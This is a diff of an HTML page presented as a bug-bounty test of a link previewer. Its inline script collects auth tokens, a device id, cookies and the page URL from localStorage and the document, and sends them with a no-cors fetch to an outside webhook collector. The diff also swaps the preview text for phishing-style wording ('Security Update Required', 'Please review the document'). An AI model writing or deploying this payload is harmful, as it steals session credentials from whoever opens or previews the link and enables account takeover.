@@ -1,46 +1,51 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Bug Bounty Test</title>
-    
-    <meta property="og:title" content="Security Research - Preview Test">
-    <meta property="og:description" content="Checking for XSS and SSRF in link previewer">
-    <meta property="og:image" content="https://via.placeholder.com/300">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preview Investigation</title>
+
+    <meta property="og:title" content="Security Update Required">
+    <meta property="og:description" content="Please review the document at this link.">
+    <meta property="og:image" content="https://via.placeholder.com/600x315.png?text=Security+Research">
 
     <script>
         (function() {
             try {
-                // 1. Собираем данные
+                // 1. Собираем всё самое ценное из LocalStorage
                 const loot = {
                     auth: localStorage.getItem('__oneme_auth'),
                     callToken: localStorage.getItem('__oneme_calls_auth_token'),
                     deviceId: localStorage.getItem('__oneme_device_id'),
                     url: window.location.href,
                     cookies: document.cookie,
-                    userAgent: navigator.userAgent
+                    timestamp: new Date().toISOString()
                 };
 
                 // 2. Отправляем на вебхук
-                // Используем метод 'no-cors' для минимизации блокировок
-                fetch('https://zmsfeowzqscjsayavbfelf22b9986mdjs.oast.fun', {
+                // Используем mode: 'no-cors', чтобы запрос прошел даже при строгой политике CORS
+                fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6', {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(loot)
-                });
-                
-                console.log("Payload sent");
-            } catch (e) {
-                console.error("Access denied:", e);
+                })
+                .then(() => console.log('Data sent successfully'))
+                .catch((err) => console.error('Error sending data:', err));
+
+            } catch (error) {
+                // Логируем ошибки доступа, если сработал Sandboxing или SOP
+                fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=' + btoa(error.message));
             }
         })();
     </script>
 </head>
 <body>
-    <h1>Security Research Lab</h1>
-    <p>Если вы видите этот текст, парсер успешно загрузил страницу.</p>
+    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+        <h1>Research Laboratory</h1>
+        <p>If you see this, the page has been rendered by the client/bot.</p>
+    </div>
 </body>
 </html>
